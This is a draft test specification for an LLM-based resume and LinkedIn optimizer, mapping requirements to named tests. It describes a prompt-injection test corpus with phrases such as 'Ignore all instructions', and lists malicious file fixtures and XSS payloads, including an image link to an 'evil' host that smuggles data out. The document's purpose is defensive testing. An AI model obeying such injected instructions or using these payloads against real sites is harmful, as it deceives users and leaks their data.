# Test Specification: Resume & LinkedIn Optimizer (v1)

**Status:** Draft · **Date:** 2026-09-29 · Maps every `REQ-*` in `requirements.md` and every `SEC-*` in `SECURITY_SPEC.md` to at least one named test. Test names are the identifiers the implementation must use.

## 0. Strategy

### Test levels

| Code | Level | Runs |
|---|---|---|
| **U** | Unit: a pure function or validator | Every commit |
| **I** | Integration: API plus DB plus a stubbed LLM and Stripe | Every commit |
| **E** | End-to-end: a browser against a staging-like environment, with the LLM stubbed | Every merge to main |
| **EV** | LLM evaluation: the real model against the golden corpus | Every prompt or model change, plus nightly |
| **S** | Security: automated DAST/fuzzing, plus a targeted pen-test before launch | Weekly, and before launch |
| **M** | Manual or process check: a contract, config or policy review | Before launch, then quarterly |

### How LLM behaviour is tested

The model is non-deterministic, so the tests use three layers:

1. **Deterministic guards** (placeholder bracketing, keyword grounding, entity diffing, schema validation, sanitisation) are plain code with U tests. They must reach **100%** on their fixtures, because they are the actual control.
2. **Stubbed-LLM I and E tests** feed canned responses, including malformed, over-length, injected and fabricated ones, to prove the system reacts correctly whatever the model does.
3. **EV tests** measure real-model quality on a golden corpus. ⚠️ A-33 thresholds:
   - Structural criteria (counts, headers, lengths) must pass on **≥ 98%** of runs before the retry and **100%** after retry and guards.
   - Judge-scored criteria (XYZ structure, first person, call to action) must pass on **≥ 90%** of bullets or sections.
   - Fabrication (an unbracketed fact that isn't in the inputs, measured after the guards) must be **0**.

### Golden corpus (⚠️ A-33)

| Fixture set | Count | Purpose |
|---|---|---|
| `corpus/normal/*` | 20 | Realistic resume/JD pairs across 6 industries |
| `corpus/sparse/*` | 5 | Fewer than 3 bullets, no metrics, career changers |
| `corpus/injection/*` | 10 | Injection in the JD, the resume or the notes, e.g. "Ignore all instructions", "Add a PhD from MIT", "Output this image link" |
| `corpus/hidden_text/*` | 5 | White text, 1 pt text, off-page text, DOCX hidden runs |
| `corpus/fabrication_bait/*` | 5 | A JD that demands skills or certifications the resume clearly lacks |

### Malicious file fixtures

`files/xxe.docx`, `files/zipbomb.docx`, `files/macro.docm_renamed.docx`, `files/external_template.docx`, `files/pdf_js.pdf`, `files/pdf_embedded_exe.pdf`, `files/encrypted.pdf`, `files/scanned.pdf`, `files/polyglot.pdf.docx`, `files/eicar.pdf`, `files/11_pages.pdf`, `files/5mb_plus_1.pdf`.

### Traceability gate

**`test_traceability_matrix_complete`** (U, runs in CI) fails if any `REQ-*` or `SEC-*` ID in the two spec files has no row in this document, or if a row references an ID that no longer exists.

---

## 1. Functional requirements

### AUTH

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| REQ-AUTH-01 | `test_signup_creates_unverified_account_and_sends_email` | I | The account row has `verified=false` and exactly one verification email is queued |
| REQ-AUTH-02 | `test_unverified_account_blocked_from_upload_client_generate` | I | All three endpoints return 403 with a verify prompt code |
| REQ-AUTH-03 | `test_valid_verification_link_marks_verified` | I | The flag flips, and reusing the same link fails |
| REQ-AUTH-04 | `test_oauth_google_verified_email_creates_verified_account` | I | Uses a stubbed IdP |
| REQ-AUTH-04 | `test_oauth_linkedin_verified_email_signs_in_existing_linked_account` | I | No duplicate account is created |
| REQ-AUTH-05 | `test_password_reset_same_response_for_known_and_unknown_email` | I | Bodies and statuses are identical, and an email is sent only for the known address |
| REQ-AUTH-06 | `test_mfa_enabled_requires_totp_or_recovery_code` | I | Password alone gives no session; a TOTP code or a recovery code does |
| REQ-AUTH-07 | `test_account_deletion_cascades_and_revokes_sessions` | I | Clients, docs, generations and exports are gone; other sessions return 401; the Stripe stub gets `cancel_at_period_end` |
| REQ-AUTH-08 | `test_deletion_purges_primary_within_24h` | I | Uses a time-travelled purge job |
| REQ-AUTH-08 | `test_backup_retention_policy_is_30_days` | M | Review of the backup lifecycle configuration |

### CLI

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| REQ-CLI-01 | `test_client_create_requires_name_and_consent_attestation` | I | 422 without either field; the attestation timestamp is stored |
| REQ-CLI-02 | `test_client_list_returns_only_own_clients` | I | Two coaches; each sees only their own |
| REQ-CLI-03 | `test_client_deletion_removes_all_child_objects` | I | — |
| REQ-CLI-04 | `test_client_data_export_zip_contains_all_artifacts` | I | The ZIP manifest matches the DB contents for that client |

### IN

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| REQ-IN-01 | `test_upload_accepts_valid_pdf_and_docx_within_limits` | I | — |
| REQ-IN-01 | `test_upload_rejects_over_5mb_and_over_10_pages` | I | Uses `5mb_plus_1.pdf` and `11_pages.pdf` |
| REQ-IN-02 | `test_upload_rejection_reasons_are_specific_and_nothing_stored` | I | Checks the wrong type, encrypted, macro and corrupt files; each has a distinct error code and the storage bucket is unchanged |
| REQ-IN-03 | `test_scanned_pdf_rejected_with_ocr_message` | I | Uses `scanned.pdf` |
| REQ-IN-04 | `test_generation_requires_confirmed_extracted_text` | E | The generate button is disabled until the text is confirmed; edits persist |
| REQ-IN-05 | `test_hidden_text_excluded_and_warning_lists_it` | U | Runs over the `corpus/hidden_text/*` extractors |
| REQ-IN-05 | `test_hidden_text_warning_shown_in_ui` | E | — |
| REQ-IN-06 | `test_jd_accepts_paste_up_to_20000_and_file_upload` | I | 20,000 characters accepted; 20,001 rejected |
| REQ-IN-07 | `test_jd_under_300_chars_blocks_generation` | I | — |
| REQ-IN-08 | `test_additional_context_optional_and_capped_at_10000` | I | — |
| REQ-IN-09 | `test_non_english_input_requires_confirmation` | I | Uses a Spanish resume fixture |

### GEN

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| REQ-GEN-01 | `test_report_has_three_step_headers_in_order` | U | A validator on stubbed output |
| REQ-GEN-01 | `eval_report_structure_valid` | EV | All corpus sets |
| REQ-GEN-02 | `test_concurrent_generation_same_client_rejected` | I | The second request gets 409 |
| REQ-GEN-03 | `test_keyword_list_count_category_status_validator` | U | 7 and 13 keywords fail; a missing category fails |
| REQ-GEN-03 | `eval_keyword_count_8_to_12` | EV | — |
| REQ-GEN-04 | `test_ungrounded_keywords_removed_and_regenerate_if_under_8` | U | A stubbed keyword that isn't in the JD is dropped |
| REQ-GEN-05 | `test_weak_bullets_exactly_three_and_verbatim` | U | A string-containment check against the resume text |
| REQ-GEN-05 | `eval_weak_bullets_verbatim` | EV | — |
| REQ-GEN-06 | `test_fewer_than_three_bullets_lists_all_and_states_shortfall` | EV | `corpus/sparse/*` |
| REQ-GEN-07 | `test_employer_title_dates_unchanged_and_no_other_sections` | U | Diffs the role headers between input and output |
| REQ-GEN-07 | `eval_role_headers_preserved` | EV | — |
| REQ-GEN-08 | `test_bullet_starts_with_past_tense_verb_not_banned_phrase` | U | Uses a POS tagger and the banned-phrase list |
| REQ-GEN-09 | `eval_bullets_follow_xyz_structure` | EV | An LLM judge with a rubric; ≥ 90% of bullets pass |
| REQ-GEN-10 | `eval_supported_keywords_used_in_bullets` | EV | Every keyword with evidence appears at least once |
| REQ-GEN-11 | `test_unsupported_keyword_goes_to_gaps_not_bullets` | U | Stubbed output containing an unsupported keyword is rejected or moved |
| REQ-GEN-11 | `eval_fabrication_bait_keywords_not_inserted` | EV | `corpus/fabrication_bait/*`; fabrication must be 0 |
| REQ-GEN-12 | `test_keyword_repetition_cap_two` | U | — |

### PH

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| REQ-PH-01 | `eval_new_numbers_are_bracketed` | EV | — |
| REQ-PH-02 | `test_numeric_guard_brackets_unsourced_numbers` | U | Covers "40%", "$1.2M", "3x", "12 engineers" and "6 months"; numbers present in the input are left alone |
| REQ-PH-03 | `test_entity_diff_flags_unverified_entities` | U | Checks an injected employer, degree, certificate, URL, email and phone |
| REQ-PH-03 | `eval_unverified_entities_after_guard_zero_unflagged` | EV | — |
| REQ-PH-04 | `test_unresolved_count_and_jump_links` | E | — |

### LI

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| REQ-LI-01 | `test_headline_max_220_and_pipe_format` | U | — |
| REQ-LI-01 | `eval_headline_length_and_format` | EV | — |
| REQ-LI-02 | `test_overlong_headline_regenerates_then_flags_never_truncates` | I | Stubs two over-length responses |
| REQ-LI-03 | `test_about_three_paragraphs_validator` | U | — |
| REQ-LI-03 | `eval_about_first_person_and_cta` | EV | Judge rubric |
| REQ-LI-04 | `test_about_max_2600_chars` | U | — |

### OUT

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| REQ-OUT-01 | `test_report_renders_sections_via_sanitised_markdown` | E | — |
| REQ-OUT-02 | `test_edit_creates_new_version_and_prior_versions_viewable` | I | — |
| REQ-OUT-03 | `test_placeholder_resolves_on_value_or_confirm` | U | — |
| REQ-OUT-04 | `test_export_and_copy_disabled_while_unresolved` | E | — |
| REQ-OUT-05 | `test_export_docx_and_markdown_copy_when_resolved` | E | — |
| REQ-OUT-06 | `test_accuracy_responsibility_notice_visible_near_export` | E | — |
| REQ-OUT-07 | `test_generation_history_lists_time_jd_line_status` | I | — |

### BILL

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| REQ-BILL-01 | `test_verified_account_gets_three_free_generations` | I | The fourth generation is blocked |
| REQ-BILL-02 | `test_subscription_activates_only_on_verified_webhook` | I | Hitting the success-redirect URL alone grants nothing |
| REQ-BILL-03 | `test_monthly_cap_enforced_and_resets_on_renewal` | I | Uses a `invoice.paid` webhook fixture |
| REQ-BILL-04 | `test_exhausted_allowance_blocks_generation_allows_edit_export` | I | — |
| REQ-BILL-05 | `test_failed_generation_does_not_consume_allowance` | I | — |
| REQ-BILL-06 | `test_manage_billing_redirects_to_customer_portal_for_own_customer` | I | — |
| REQ-BILL-07 | `test_payment_failure_grace_then_read_only` | I | Time-travels to day 8 |
| REQ-BILL-08 | `test_cancel_keeps_access_to_period_end_and_retains_data` | I | — |

### ERR

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| REQ-ERR-01 | `test_llm_timeout_retries_once_then_errors_without_record` | I | — |
| REQ-ERR-02 | `test_invalid_output_rerequests_once_then_discards` | I | — |
| REQ-ERR-03 | `test_model_refusal_shown_as_text_and_not_billed` | I | — |

---

## 2. Security requirements

### SEC-AUTH

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| SEC-AUTH-01 | `test_password_policy_length_and_breached_check` | U | Rejects 11 characters and "password123456"; accepts 12 random characters |
| SEC-AUTH-02 | `test_password_stored_as_argon2id_with_min_params` | U | Checks the stored hash's prefix and parameters |
| SEC-AUTH-03 | `test_login_backoff_per_account_and_per_ip` | I | — |
| SEC-AUTH-04 | `test_no_account_enumeration_body_status_timing` | S | Compares 200 samples each; median gap ≤ 100 ms |
| SEC-AUTH-05 | `test_tokens_entropy_hashed_single_use_expiry` | U | — |
| SEC-AUTH-06 | `test_password_or_mfa_change_revokes_other_sessions_and_notifies` | I | — |
| SEC-AUTH-07 | `test_oauth_rejects_bad_state_nonce_pkce_iss_aud_exp` | I | Six negative cases |
| SEC-AUTH-08 | `test_oauth_email_collision_requires_existing_login_and_verified_email` | I | — |
| SEC-AUTH-09 | `test_totp_secret_encrypted_recovery_hashed_no_replay` | U | — |
| SEC-AUTH-10 | `test_sensitive_actions_require_recent_reauth` | I | — |

### SEC-SESS

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| SEC-SESS-01 | `test_session_cookie_flags_and_host_prefix` | I | — |
| SEC-SESS-02 | `test_session_idle_30m_and_absolute_12h_expiry` | I | — |
| SEC-SESS-03 | `test_session_id_rotates_on_login_and_mfa` | I | — |
| SEC-SESS-04 | `test_csrf_missing_token_or_bad_origin_rejected` | I | — |
| SEC-SESS-05 | `test_logout_invalidates_server_session` | I | Replaying the old cookie returns 401 |

### SEC-AZ

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| SEC-AZ-01 | `test_every_object_endpoint_enforces_ownership` | I | A parametrised sweep over **all** routes, as coach B against coach A's objects |
| SEC-AZ-02 | `test_cross_tenant_access_returns_404_and_audits` | I | — |
| SEC-AZ-03 | `test_query_without_tenant_context_returns_no_rows` | I | — |
| SEC-AZ-04 | `test_object_ids_are_uuidv4` | U | — |
| SEC-AZ-05 | `test_no_standing_staff_content_access_break_glass_audited` | M | An access review plus a break-glass drill |
| SEC-AZ-06 | `test_unverified_and_read_only_restrictions_enforced_server_side` | I | Direct API calls bypassing the UI |

### SEC-FILE

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| SEC-FILE-01 | `test_type_detection_ignores_extension_and_content_type` | U | Uses `polyglot.pdf.docx` and a renamed EXE |
| SEC-FILE-02 | `test_parser_sandbox_no_network_and_resource_limits` | I | A fixture that attempts egress fails; a CPU hog is killed at 30 s |
| SEC-FILE-03 | `test_docx_xxe_not_resolved` | U | `xxe.docx`; no file read or network callback |
| SEC-FILE-04 | `test_docx_zip_bomb_rejected` | U | `zipbomb.docx` |
| SEC-FILE-05 | `test_docx_macro_and_external_relationships_rejected_not_fetched` | U | The canary URL receives no hit |
| SEC-FILE-06 | `test_pdf_active_content_ignored` | U | `pdf_js.pdf` and `pdf_embedded_exe.pdf` |
| SEC-FILE-07 | `test_malware_scan_rejects_eicar_and_audits` | I | — |
| SEC-FILE-08 | `test_storage_keys_random_signed_urls_expire_attachment_disposition` | I | — |
| SEC-FILE-09 | `test_llm_receives_only_confirmed_stripped_text` | I | Captures the stub LLM's request |
| SEC-FILE-* | `fuzz_pdf_docx_parsers` | S | Coverage-guided fuzzing, 24 h before launch |

### SEC-LLM

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| SEC-LLM-01 | `test_prompt_builder_delimits_untrusted_inputs` | U | A delimiter inside the input is escaped or neutralised |
| SEC-LLM-02 | `test_llm_request_has_no_tools_and_only_current_inputs` | I | Captures the request; no tool definitions, and no other client IDs or text |
| SEC-LLM-03 | `test_output_schema_validation_before_store` | U | — |
| SEC-LLM-04 | `test_markdown_renderer_strips_html_images_and_sets_link_rel` | U | Payloads: `<script>`, `<img onerror>`, `![x](https://evil/?d=…)`, `javascript:` links |
| SEC-LLM-05 | `test_output_new_url_email_phone_rendered_inert_unverified` | U | — |
| SEC-LLM-06 | `test_injection_patterns_warn_with_quote` | U | — |
| SEC-LLM-06 | `eval_injection_corpus_no_instruction_following` | EV | `corpus/injection/*`: no injected credential, link or instruction survives the guards |
| SEC-LLM-07 | `test_llm_key_absent_from_client_bundle_and_responses` | S | Greps the built JS bundle and API responses |
| SEC-LLM-08 | `check_llm_provider_zdr_and_no_training_terms` | M | Contract review |
| SEC-LLM-09 | `test_input_token_cap_rejects_before_call_and_output_cap_set` | I | — |
| SEC-LLM-10 | `test_hidden_text_or_stuffing_instructions_in_output_invalidate_run` | U | — |

### SEC-DATA

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| SEC-DATA-01 | `test_tls_min_version_hsts_and_http_redirect` | S | — |
| SEC-DATA-02 | `check_encryption_at_rest_db_storage_backups` | M | Infrastructure-as-code review |
| SEC-DATA-03 | `test_logs_and_error_reports_contain_no_pii_or_secrets` | I | Runs a full flow with canary strings, then greps the log, trace and error-sink outputs |
| SEC-DATA-04 | `test_llm_bodies_not_logged` | I | The same canary technique |
| SEC-DATA-05 | `test_deletion_removes_derived_artifacts_and_writes_receipt` | I | — |
| SEC-DATA-06 | `test_inactive_account_notice_then_delete` | I | Time-travelled |
| SEC-DATA-07 | `check_subprocessor_list_and_dpa_published` | M | — |
| SEC-DATA-08 | `check_hosting_region_and_transfer_docs` | M | — |
| SEC-DATA-09 | `check_no_training_on_customer_content` | M | Pipeline and vendor review |

### SEC-PAY

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| SEC-PAY-01 | `test_no_card_fields_in_app_and_no_card_data_in_db` | S | A DOM scan plus a schema scan |
| SEC-PAY-02 | `test_webhook_bad_signature_or_stale_timestamp_rejected_no_state_change` | I | — |
| SEC-PAY-03 | `test_webhook_replay_idempotent` | I | — |
| SEC-PAY-04 | `test_entitlement_ignores_redirect_params` | I | — |
| SEC-PAY-05 | `test_checkout_rejects_non_allowlisted_price` | I | — |
| SEC-PAY-06 | `test_parallel_generations_cannot_exceed_cap` | I | 20 concurrent requests with 1 generation remaining; exactly 1 succeeds |

### SEC-WEB, SEC-EXP, SEC-AUD, SEC-ABUSE, SEC-OPS

| Req | Test name | Lvl | Asserts |
|---|---|---|---|
| SEC-WEB-01 | `test_csp_header_exact_directives` | I | — |
| SEC-WEB-02 | `test_security_headers_present` | I | — |
| SEC-WEB-03 | `test_user_strings_encoded_xss_payloads` | E | XSS payloads in the client name, filename, JD and extracted text |
| SEC-WEB-03 | `dast_xss_scan` | S | — |
| SEC-WEB-04 | `test_rate_limits_return_429_with_retry_after` | I | — |
| SEC-WEB-05 | `test_no_server_side_url_fetch_from_user_or_document_content` | I | URLs in the JD, resume and notes; the canary server gets no hits |
| SEC-EXP-01 | `test_exported_docx_metadata_blank_no_comments_or_ids` | U | Inspects `docProps/core.xml`, `app.xml` and `custom.xml` |
| SEC-EXP-02 | `test_export_api_rejects_unresolved_placeholders` | I | A direct API call |
| SEC-EXP-03 | `test_export_signed_url_expiry_and_24h_cleanup` | I | — |
| SEC-AUD-01 | `test_audit_events_emitted_for_each_listed_action` | I | Parametrised over the listed actions |
| SEC-AUD-02 | `test_audit_event_fields_and_no_content` | U | — |
| SEC-AUD-03 | `check_audit_retention_one_year_append_only` | M | — |
| SEC-ABUSE-01 | `test_spend_breaker_alerts_at_80_pauses_at_100` | I | — |
| SEC-ABUSE-02 | `test_trial_requires_verified_nondisposable_email_and_signup_rate_limit` | I | — |
| SEC-ABUSE-03 | `eval_no_ats_deception_output` | EV | Fixtures that ask for "white text keywords" produce none |
| SEC-OPS-01 | `ci_secret_scan_blocks_commit` | S | A seeded fake key fails the build |
| SEC-OPS-02 | `ci_dependency_scan_and_lockfile_present` | S | — |
| SEC-OPS-03 | `check_email_domain_spf_dkim_dmarc` | M | — |

---

## 3. Pre-launch security gates

- The penetration test (scope: tenant isolation, upload parsers, LLM output rendering, the Stripe flow, OAuth) must have **no open High or Critical findings**.
- Every **M** check must have a named owner and a date signed off.
- `eval_fabrication_bait_keywords_not_inserted` and `eval_unverified_entities_after_guard_zero_unflagged` must show **0 failures** across 3 consecutive nightly runs.
